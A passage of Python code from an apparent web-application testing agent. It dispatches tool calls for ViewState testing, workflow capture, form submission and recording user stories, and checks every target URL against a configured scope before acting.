        elif name == "test_viewstate_binding":
            url = arguments["target_url"]
            if not _is_in_scope(url, target_scope):
                return json.dumps({"status": "error", "message": f"Out of scope: {url}"})
            result = await _tool_test_viewstate_binding(target_url=url)

        elif name == "capture_workflow":
            start_url = arguments["start_url"]
            if not _is_in_scope(start_url, target_scope):
                return json.dumps({"status": "error", "message": f"Out of scope: {start_url}"})
            actions = arguments.get("actions", [])
            # Also scope-check any navigate actions
            for act in actions:
                if isinstance(act, dict) and act.get("type") == "navigate":
                    u = act.get("url", "")
                    if u and not _is_in_scope(u, target_scope):
                        return json.dumps({"status": "error", "message": f"Out of scope navigate action: {u}"})
            result = await _tool_capture_workflow(
                start_url=start_url,
                actions=actions,
                wait_seconds=arguments.get("wait_seconds", 2),
            )

        elif name == "submit_form":
            url = arguments["url"]
            if not _is_in_scope(url, target_scope):
                return json.dumps({"status": "error", "message": f"Out of scope: {url}"})
            result = await _tool_submit_form(
                url=url,
                field_overrides=arguments.get("field_overrides", {}),
                form_index=arguments.get("form_index", 0),
                follow_redirects=arguments.get("follow_redirects", False),
            )

        elif name == "record_user_story":
            # Build story dict from args
            story = {
                "candidate_id": arguments.get("candidate_id", ""),
                "candidate_name": arguments.get("candidate_name", ""),
                "status": arguments.get("status", "partial"),
                "personas": arguments.get("personas", []),
                "routes": arguments.get("routes", []),
                "apis": arguments.get("apis", []),
                "technologies": arguments.get("technologies", []),
                "notes": arguments.get("notes", []),
                "follow_up_candidates": arguments.get("follow_up_candidates", []),
                "unresolved_gaps": arguments.get("unresolved_gaps", []),
                "sensitive_data": arguments.get("sensitive_data", ""),
                "recorded_at": __import__("datetime").datetime.now().isoformat(),
            }
            result = await _tool_record_user_story(ws_id, story)

        else:
            result = {
                "status": "error",
                "message": f"Unknown tool: {name}",
            }

    except Exception as exc:
        logger.error("agent_tool.error", tool=name, error=str(exc))
        result = {
            "status": "error",
            "message": f"Tool '{name}' failed: {exc}",
        }

    return _truncate(json.dumps(result, default=str))
